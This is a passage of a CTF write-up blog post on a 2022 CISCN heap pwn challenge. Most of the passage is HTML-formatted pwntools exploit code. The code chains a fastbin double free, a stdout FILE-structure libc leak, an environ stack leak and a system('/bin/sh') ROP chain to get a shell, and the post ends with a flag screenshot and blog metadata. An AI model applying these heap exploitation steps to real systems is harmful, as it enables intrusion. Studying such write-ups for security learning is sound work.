class=\"number\">22</span>, <span class=\"number\">0x68</span>, <span class=\"string\">&#x27;aaaa&#x27;</span>)</span><br><span class=\"line\">    add(<span class=\"number\">23</span>, <span class=\"number\">0x68</span>, <span class=\"string\">&#x27;aaaa&#x27;</span>)</span><br><span class=\"line\">    add(<span class=\"number\">24</span>, <span class=\"number\">0x68</span>, <span class=\"string\">&#x27;aaaa&#x27;</span>)</span><br><span class=\"line\">    flag = <span class=\"number\">0xfbad1800</span></span><br><span class=\"line\">    <span class=\"keyword\">try</span>: </span><br><span class=\"line\">        add(<span class=\"number\">25</span>, <span class=\"number\">0x68</span>, <span class=\"string\">&#x27;\\x00&#x27;</span>*<span class=\"number\">0x33</span> + p64(flag) + p64(<span class=\"number\">0</span>)*<span class=\"number\">3</span> +<span class=\"string\">&#x27;\\x48&#x27;</span>)</span><br><span class=\"line\">        inp = io.recv(<span class=\"number\">200</span>, timeout=<span class=\"number\">2</span>)</span><br><span class=\"line\">        log.success(<span class=\"string\">&#x27;inp:&#x27;</span>+inp)</span><br><span class=\"line\">        <span class=\"keyword\">break</span></span><br><span class=\"line\">        _IO_2_stdout_ = u64(inp)</span><br><span class=\"line\">        log.success(<span class=\"string\">&#x27;_IO_2_stdout_:&#x27;</span>+<span class=\"built_in\">hex</span>(_IO_2_stdout_))</span><br><span class=\"line\">        <span class=\"keyword\">break</span></span><br><span class=\"line\">    <span class=\"keyword\">except</span>:</span><br><span class=\"line\">        io.close()</span><br><span class=\"line\">        io = getIO()</span><br><span class=\"line\"></span><br><span class=\"line\">inp = io.recvuntil(<span class=\"string\">&#x27;\\x7f&#x27;</span>).ljust(<span class=\"number\">8</span>, <span class=\"string\">&#x27;\\x00&#x27;</span>)</span><br><span class=\"line\">_IO_2_stdout_ = u64(inp)</span><br><span class=\"line\">log.success(<span class=\"string\">&#x27;_IO_2_stdout_:&#x27;</span>+<span class=\"built_in\">hex</span>(_IO_2_stdout_))</span><br><span class=\"line\">libc_base = _IO_2_stdout_ - <span class=\"number\">0x3c56a3</span> </span><br><span class=\"line\">log.success(<span class=\"string\">&#x27;libc_base:&#x27;</span>+<span class=\"built_in\">hex</span>(libc_base))</span><br><span class=\"line\"></span><br><span class=\"line\">stdout_addr = libc_base + <span class=\"number\">0x3c55dd</span> </span><br><span class=\"line\">environ = libc_base + <span class=\"number\">0x003C6F38</span>  </span><br><span class=\"line\">add(<span class=\"number\">20</span>, <span class=\"number\">0x68</span>, <span class=\"string\">&#x27;aaaa&#x27;</span>) <span class=\"comment\"># b</span></span><br><span class=\"line\">add(<span class=\"number\">21</span>, <span class=\"number\">0x68</span>, <span class=\"string\">&#x27;aaaa&#x27;</span>) <span class=\"comment\"># a</span></span><br><span class=\"line\">add(<span class=\"number\">22</span>, <span class=\"number\">0x28</span>, <span class=\"string\">&#x27;aaaa&#x27;</span>)</span><br><span class=\"line\">free(<span class=\"number\">21</span>)</span><br><span class=\"line\">free(<span class=\"number\">20</span>)</span><br><span class=\"line\">free(<span class=\"number\">21</span>)</span><br><span class=\"line\">add(<span class=\"number\">21</span>, <span class=\"number\">0x68</span>, p64(stdout_addr))</span><br><span class=\"line\">add(<span class=\"number\">22</span>, <span class=\"number\">0x68</span>, <span class=\"string\">&#x27;aaaa&#x27;</span>)</span><br><span class=\"line\">add(<span class=\"number\">23</span>, <span class=\"number\">0x68</span>, <span class=\"string\">&#x27;aaaa&#x27;</span>)</span><br><span class=\"line\">add(<span class=\"number\">24</span>, <span class=\"number\">0x68</span>,  <span class=\"string\">&#x27;\\x00&#x27;</span>*<span class=\"number\">0x33</span> + p64(flag) + p64(<span class=\"number\">0</span>)*<span class=\"number\">3</span> +p64(environ) + p64(environ+<span class=\"number\">0x10</span>)*<span class=\"number\">2</span>)</span><br><span class=\"line\">stack_addr =  u64(io.recv(<span class=\"number\">8</span>))</span><br><span class=\"line\">log.success(<span class=\"string\">&#x27;stack_addr:&#x27;</span>+<span class=\"built_in\">hex</span>(stack_addr))</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># add(32, 0x68, &#x27;aaaa&#x27;)</span></span><br><span class=\"line\"></span><br><span class=\"line\">target = stack_addr - <span class=\"number\">0x163</span> - <span class=\"number\">8</span>  </span><br><span class=\"line\">add(<span class=\"number\">20</span>, <span class=\"number\">0x68</span>, <span class=\"string\">&#x27;aaaa&#x27;</span>) <span class=\"comment\"># b</span></span><br><span class=\"line\">add(<span class=\"number\">21</span>, <span class=\"number\">0x68</span>, <span class=\"string\">&#x27;aaaa&#x27;</span>) <span class=\"comment\"># a</span></span><br><span class=\"line\">add(<span class=\"number\">22</span>, <span class=\"number\">0x28</span>, <span class=\"string\">&#x27;aaaa&#x27;</span>)</span><br><span class=\"line\">free(<span class=\"number\">21</span>)</span><br><span class=\"line\">free(<span class=\"number\">20</span>)</span><br><span class=\"line\">free(<span class=\"number\">21</span>)</span><br><span class=\"line\">add(<span class=\"number\">21</span>, <span class=\"number\">0x68</span>, p64(target))</span><br><span class=\"line\">add(<span class=\"number\">22</span>, <span class=\"number\">0x68</span>, <span class=\"string\">&#x27;aaaa&#x27;</span>)</span><br><span class=\"line\">add(<span class=\"number\">23</span>, <span class=\"number\">0x68</span>, <span class=\"string\">&#x27;aaaa&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">libc = ELF(<span class=\"string\">&#x27;./libc-2.23.so&#x27;</span>)</span><br><span class=\"line\">pop_rdi = <span class=\"number\">0x0000000000021112</span> + libc_base</span><br><span class=\"line\">sys_addr = libc.sym[<span class=\"string\">&#x27;system&#x27;</span>] + libc_base</span><br><span class=\"line\">binsh = <span class=\"number\">0x0018CE57</span> + libc_base</span><br><span class=\"line\"></span><br><span class=\"line\">ropp = p64(pop_rdi) + p64(binsh) + p64(sys_addr)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># gdb.attach(io)</span></span><br><span class=\"line\"></span><br><span class=\"line\">add(<span class=\"number\">24</span>, <span class=\"number\">0x68</span>, <span class=\"string\">&#x27;a&#x27;</span> * <span class=\"number\">0x43</span> + ropp)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># add(20, 0x68, &#x27;aaaa&#x27;) # b</span></span><br><span class=\"line\"><span class=\"comment\"># add(21, 0x68, &#x27;aaaa&#x27;) # a</span></span><br><span class=\"line\"><span class=\"comment\"># add(22, 0x28, &#x27;aaaa&#x27;)</span></span><br><span class=\"line\"><span class=\"comment\"># free(21)</span></span><br><span class=\"line\"><span class=\"comment\"># free(20)</span></span><br><span class=\"line\"><span class=\"comment\"># free(21)</span></span><br><span class=\"line\"><span class=\"comment\"># add(21, 0x68, p64(stdout_addr))</span></span><br><span class=\"line\"><span class=\"comment\"># add(22, 0x68, &#x27;aaaa&#x27;)</span></span><br><span class=\"line\"><span class=\"comment\"># add(23, 0x68, &#x27;aaaa&#x27;)</span></span><br><span class=\"line\"><span class=\"comment\"># add(24, 0x68,  &#x27;\\x00&#x27;*0x33 + p64(flag) + p64(0)*3 +p64(target) + p64(target+0x100)*2)</span></span><br><span class=\"line\"></span><br><span class=\"line\">io.interactive()</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"getFlag\"><a href=\"#getFlag\" class=\"headerlink\" title=\"getFlag\"></a>getFlag</h2><p><img src=\"/p/2022CISCN-hn-wp/image-20220621162605176.png\" alt=\"image-20220621162605176\"></p>\n","path":"/p/2022CISCN-hn-wp/","permalink":"https://blog.csome.cc/p/2022CISCN-hn-wp/","tags":[{"name":"CTF","_id":"cuidvZ3AUibcKOkbkNEMC3ltU","slug":"CTF","path":"tags/CTF/","permalink":"https://blog.csome.cc/tags/CTF/","length":15},{"name":"Pwn","_id":"cuid9EjKHYI0JNtcQl-odZaE8","slug":"Pwn","path":"tags/Pwn/","permalink":"https://blog.csome.cc/tags/Pwn/","length":15},{"name":"CISCN","_id":"cuidK3TprH3BU2Nejn2TycYXL","slug":"CISCN","path":"tags/CISCN/","permalink":"https://blog.csome.cc/tags/CISCN/","length":1}],"categories":[],"prev":{"title":"[2023NepCTF] Csome Writeup","date":"2023-08-15T08:11:37.000Z","slug":"2023NepCTF","published":true,"updated":"2025-10-28T08:00:40.743Z","_id":"cuidC-n_8JBGdGBSSVnvfsumM","layout":"post","photos":[],"excerpt":"","path":"/p/2023NepCTF/","permalink":"https://blog.csome.cc/p/2023NepCTF/","__post":true},"next":{"title":"[2022gdCTF]jmp_rsp midpwn easyheap WP","date":"2022-05-23T00:51:26.000Z","slug":"2022gdCTF-pwn","published":true,"updated":"2025-10-28T08:00:40.727Z","_id":"cuidZrA66CisksNPVA4C-6900","layout":"post","photos":[],"excerpt":"","path":"/p/2022gdCTF-pwn/","permalink":"https://blog.csome.cc/p/2022gdCTF-pwn/","__post":true},"__post":true}